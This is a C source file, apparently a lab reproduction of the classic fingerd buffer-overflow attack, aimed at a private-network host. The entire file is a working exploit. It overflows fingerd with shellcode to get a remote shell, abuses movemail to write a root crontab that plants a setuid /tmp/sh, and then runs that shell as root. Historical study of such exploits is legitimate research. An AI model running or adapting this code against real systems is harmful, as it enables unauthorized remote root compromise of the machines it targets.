#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <stdio.h>

#define TARGET_IP "172.20.0.12"
#define FINGERD_PORT 79

#define BUF_SIZE 532
#define PAYLOAD_LEN 28
#define NOP 0x01
#define PATIENCE 3
#define IO_BUF_SIZE 2048

#define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"

create_exploit(buf, shellcode, buf_size, shellcode_len)
    char *buf;
    char *shellcode;
    int buf_size;
    int shellcode_len;
{
    int i;
	int j;

    for (i = 0; i < buf_size; i++) buf[i] = NOP;
    
    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j];

	for (i = buf_size - 4*4 - 4; i < buf_size - 4; i ++) { 
		buf[i] = 0x00; 
	}

    for (i = buf_size - 4; i < buf_size; i += 4) {
        buf[i]   = 0x38; 
        buf[i+1] = 0xea;
        buf[i+2] = 0xff;
        buf[i+3] = 0x7f;
    }
}

read_from_sock(sock, io_buf, buf_size)
    int sock;
    char *io_buf;
    int buf_size;
{
    int num_tries;
    int n;
    int readfds;
    struct timeval tv;

	num_tries = 0;

    while (num_tries < PATIENCE) {
        readfds = (1 << sock); 
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        if (select(sock + 1, &readfds, (int *)0, (int *)0, &tv) > 0) {
            n = read(sock, io_buf, buf_size - 1);
            if (n > 0) {
                io_buf[n] = '\0';
                printf("%s", io_buf);
                fflush(stdout);
                num_tries = 0;
            } else break;
        } else num_tries++;
    }
}

write_to_sock(sock, text)
    int sock;
    char *text;
{
    int len;
	
	len = strlen(text);
    write(sock, text, len);
}

main()
{
    int sock;
    struct sockaddr_in serv_addr;
    char io_buf[IO_BUF_SIZE];
    char buf[BUF_SIZE];
    
	char *echo_command = "echo connected123\n";
	char *export_path = "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n";
	char *whoami = "whoami\n";
	char *ls = "ls -al\n";

	char *movemail_exploit = "(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\n";
	char *crontab_exploit = "(echo \"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\"; echo  \"* * * * * root rm -f /usr/lib/crontab.local\") > /usr/lib/crontab.local\n";
	char *check_crontab = "cat /usr/lib/crontab.local\n";
	char *check_for_shell = "ls /tmp/sh\n"; 
	char *not_found = "/tmp/sh not found";
	char *run_shell = "/tmp/sh\n"; 
	char *touch_file = "cd /; echo Hello from ubuntu! > hello_from_ubuntu; cat hello_from_ubuntu\n";

    create_exploit(buf, PAYLOAD, BUF_SIZE, PAYLOAD_LEN);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(FINGERD_PORT);
    serv_addr.sin_addr.s_addr = inet_addr(TARGET_IP);

    if (connect(sock, &serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        exit(1);
    }

    write(sock, buf, BUF_SIZE);
    printf("Payload delivered!\n");
    sleep(1);

	write_to_sock(sock, echo_command);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

	write_to_sock(sock, export_path);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    write_to_sock(sock, "whoami\n");
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

	write_to_sock(sock, movemail_exploit);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);
    write_to_sock(sock, crontab_exploit); 
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

	do {
		write_to_sock(sock, check_for_shell); 
		read_from_sock(sock, io_buf, IO_BUF_SIZE);
		sleep(10);
	} while (strncmp(not_found, io_buf, strlen(not_found)) == 0);

	write_to_sock(sock, run_shell); 
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	write_to_sock(sock, whoami); 
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	write_to_sock(sock, touch_file); 
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

    close(sock);
    exit(0);
}
